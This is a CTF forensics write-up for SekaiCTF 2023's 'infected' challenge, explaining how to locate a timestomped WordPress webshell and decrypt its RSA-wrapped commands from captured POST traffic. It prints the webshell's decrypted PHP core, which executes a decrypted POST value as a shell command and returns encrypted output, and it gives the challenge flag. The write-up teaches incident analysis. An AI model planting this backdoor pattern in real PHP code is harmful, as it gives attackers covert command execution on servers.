---
title: "infected - sekaictf 2023"
category: "forensics"
subcategory: "rsa"
type: "writeup"
tags: ["forensics", "rsa", "chinese-remainder", "pcap", "base64", "wordpress"]
summary: "A copy of all the web server files and incoming traffic are given to the participants, along with a description that asks them how an attacker got access to a webserver."
source:
  name: "project-sekai-ctf/sekaictf-2023"
  url: "https://github.com/project-sekai-ctf/sekaictf-2023/blob/4dc0f1fb2836c64b3a502e2538ba32530996b8c9/forensics/infected/solution/README.md"
ctf:
  name: "sekaictf"
  year: 2023
  challenge: "infected"
---

## Source

- **CTF:** sekaictf 2023
- **Challenge:** infected
- **Repository:** [project-sekai-ctf/sekaictf-2023](https://github.com/project-sekai-ctf/sekaictf-2023)
- **File:** <https://github.com/project-sekai-ctf/sekaictf-2023/blob/4dc0f1fb2836c64b3a502e2538ba32530996b8c9/forensics/infected/solution/README.md>

---
# Writeup
A copy of all the web server files and incoming traffic are given to the participants, along with a description that asks them how an attacker got access to a webserver. A webshell had been placed there previously (and timestomped so sorting by most recently modified won't help) that uses 3 layers of asymmetric encryption to communicate with the host through a normal-seeming POST request. In addition, tens of thousands of other HTTP requests were sent to his server through WPScan, nikto, dirb, manual browsing, etc. 

The goal is to identify the webshell stored in `wordpress/wp-includes/date.php` and isolate all traffic belonging to it. This may be done in either order, either identifying the weird code in the file first, or isolating the malicious traffic (the only HTTP traffic with POST data also) first. Many attempts have been made to make the POST requests fit in with normal traffic (including putting the payload in HTTP multipart/form data, spoofing user agent, etc.). The timing of the shell commands were also made so they weren't sent in chunks, but rather spread across the entire capture. 

Once finding the code and traffic, only the first part has been done. Then, the user must extract a decryption key from the POST data to decrypt the PHP code, then extract a second decryption key to decrypt the commands being sent to the server. This must be done for each shell interaction until the command with the flag is decrypted. Also note that the command responses CANNOT be decrypted since the decryption key is not provided (stored on the attacker's server only). 

An example of this is done in `decrypt.php`, where the shell code has been slightly modified to take in base64-encoded data from a packet capture (only the text after `...`). This will print out:

```php
$pvk1 = "[REDACTED-PRIVATE-KEY-BLOCK]
";
$pbk1 = "-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCyucnknkBP4whz0YJrblke667f
5g4EfCmKcO2j7c+WEOWmbVBRZ/ETtqOIEM8Hp9rV605R1gJBf7tcxziEoX4wxQm5
nfAqXkHUdloGyK7p7IZTh5tX6KnckCtrwbD7EFwjWBBceVHRmnmVdtF4yIkwaD2S
4tw4O5CVYcIlIAAo6QIDAQAB
-----END PUBLIC KEY-----
";
openssl_private_decrypt($ae25f0, $decrypted, $pvk1);
$result = `{$decrypted} 2>&1`;
$encrypted = "";
$chunks = str_split($result, 116);
foreach ($chunks as $chunk) {
    openssl_public_encrypt($chunk, $tmp, $pbk1);
    $encrypted .= base64_encode($tmp).",";
}
echo $encrypted;
```

`$pvk1` can then be used to decrypt the command issued (the data BEFORE the `...` in the packet).

**Flag** - `SEKAI{h4rd_2_d3t3ct_w3bsh3ll}`
